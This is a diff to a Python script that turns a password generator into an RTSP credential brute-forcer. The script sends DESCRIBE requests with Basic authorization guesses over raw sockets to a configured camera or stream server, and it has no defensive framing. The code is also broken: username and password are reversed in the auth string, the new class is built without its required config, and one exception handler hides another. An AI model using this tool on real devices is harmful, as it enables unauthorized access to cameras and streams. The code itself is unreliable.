@@ -2,12 +2,13 @@ import base64
 import itertools
 import os.path
 import socket
-from os import error
+from password_gen import PasswordGenerator
 
 from config import Config
+pass_gen = PasswordGenerator()
 
 
-class PasswordGenerator:
+class RTSPBruteForce:
     def __init__(self, config):
         self.config = config
         self.characters = self.config.characters
@@ -51,21 +52,19 @@ class PasswordGenerator:
         credentials = f'{password}:{username}'
         credentials_bytes = credentials.encode('ascii')
         base64_bytes = base64.b64encode(credentials_bytes)
-        # encoded = base64.b64encode(f'{username}:{password}')
-        print(str(base64_bytes))
         return base64_bytes
 
     def brute_force_rtsp(self):
         try:
             b64 = self.base64encode()
             dest = f"DESCRIBE rtsp://{self.config.rtsp_ip}:{self.config.rtsp_port}/unicast RTSP/1.0\r\nCSeq: 2\r\nAuthorization: Basic {b64}\r\n\r\n"
-            # print(address)
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((self.config.rtsp_ip, self.config.rtsp_port))
             s.send(dest.encode())
             response = s.recv(512)
-
             print(self.get_response(response))
+        except socket.error as e:
+            print(e)
         except (ConnectionRefusedError, ConnectionResetError) as e:
             print(
                 f'{e}: {self.config.rtsp_ip}:{self.config.rtsp_port} - {self.config.rtsp_username}:{self.config.rtsp_password}')
@@ -75,9 +74,11 @@ class PasswordGenerator:
 
 
 
+
 if __name__ == '__main__':
     configs = Config()
     if configs.generate_paswords:
-        generator = PasswordGenerator(config=configs)
-        # generator.generate_password_dict()
-        generator.brute_force_rtsp()
+        pass_gen = PasswordGenerator()
+        pass_gen.generate_password_dict()
+    brute_forcer = RTSPBruteForce()
+    brute_forcer.brute_force_rtsp()
